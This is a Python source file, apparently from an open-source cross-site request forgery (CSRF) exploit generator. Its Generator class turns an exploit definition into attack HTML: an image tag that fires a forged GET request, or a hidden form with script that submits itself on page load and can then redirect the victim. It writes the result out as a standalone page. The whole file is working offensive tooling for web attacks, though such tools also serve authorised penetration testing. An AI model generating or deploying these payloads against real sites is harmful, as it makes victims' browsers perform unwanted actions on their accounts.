#!/usr/bin/python3
# -*- coding: utf-8 *-*
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by Nicolas Crocfer (https://github.com/ncrocfer)

import os

from urllib.parse import urlencode
from bs4 import BeautifulSoup

class Generator:

    def __init__(self, conf, exploit):
        self.conf = conf
        self.exploit = exploit
        self.form_id = "csr2f"

    def get_form(self):

        # for GET method, we send an image tag
        if self.exploit['method'] == 'GET':

            get_params = {}
            for p in self.exploit['params']:
                try:
                    get_params[p['name']] = p['user_value']
                except KeyError:
                    get_params[p['name']] = p['value']

            url = self.conf['host_url'] + self.exploit['path'] + "?" + urlencode(get_params)
            return '<img src="{}" />'.format(url)

        # for POST method, we send a complete form
        elif self.exploit['method'] == 'POST':

            form_action = self.conf['host_url'] + self.exploit['path']

            # form params
            form_params = ""
            for k, v in self.exploit['form'].items():
                if k != "id":
                    form_params += ' {}="{}"'.format(k, v)
                else:
                    self.form_id = v

            # Fields
            form_inputs = ""
            for p in self.exploit['params']:
                input_params = ""
                for k, v in p.items():
                    if k not in ['name', 'type', 'value', 'custom', 'description', 'user_value']:
                        input_params += '{}="{}" '.format(k, v)

                try:
                    input_type = p['type']
                except KeyError:
                    input_type = "hidden"
                try:
                    input_name = 'name="{}" '.format(p['name'])
                except KeyError:
                    input_name = ""
                try:
                    input_value = 'value="{}" '.format(p['user_value'])
                except KeyError:
                    try:
                        input_value = 'value="{}" '.format(p['value'])
                    except KeyError:
                        input_value = ""

                # Input fields
                if input_type in ['text', 'hidden', 'submit', 'checkbox', 'password']:
                    form_inputs += '<input type="{}" {}{}{}/>'.format(input_type, input_name, input_value, input_params)
                # Textarea fields
                elif input_type == "textarea":
                    try:
                        value = '{}'.format(p['user_value'])
                    except KeyError:
                        try:
                            value = '{}'.format(p['value'])
                        except KeyError:
                            value = ""
                    form_inputs += '<textarea {}{}>{}</textarea>'.format(input_name, input_params, value)

            redirect = ' window.location="{}";'.format(self.conf['redirect_url']) if self.conf['redirect'].lower() == 'true' else ""
            html = '<form action="{}" method="post" id="{}"{}>\n{}</form>\n<script type="text/javascript">\ndocument.getElementById("{}").submit();{}</script>'.format(form_action, self.form_id, form_params, form_inputs, self.form_id, redirect)
            soup = BeautifulSoup(html)
            return soup.prettify(formatter=None)

        else:
            return None

    def get_page(self):

        form = self.get_form()

        if self.conf['html_skeleton'].lower() != "true":
            return form
        else:
            html = """<!DOCTYPE html>
<html>
<head>
<meta charset=utf-8 />
<title>{}</title>
</head>
<body>
{}
</body>
</html>""".format(self.conf['html_title'], form)

            soup = BeautifulSoup(html)
            return soup.prettify(formatter=None)


    def save_file(self, filename):

        filename = filename.translate(str.maketrans("", "", "/\/:"))
        path = os.path.join(os.getcwd(), "output/", filename)
        can_write = True
        if os.path.isfile(path):
            replace = str(input("This file already exists and will be erase. Replace it (Y/n) ? "))
            can_write = True if replace.lower() == 'y' or replace.lower() == "" else False

        if not can_write :
            return False

        try:
            with open(path, encoding="utf-8", mode="w") as f:
                f.write(self.get_page())
        except IOError:
            return False
        else:
            return True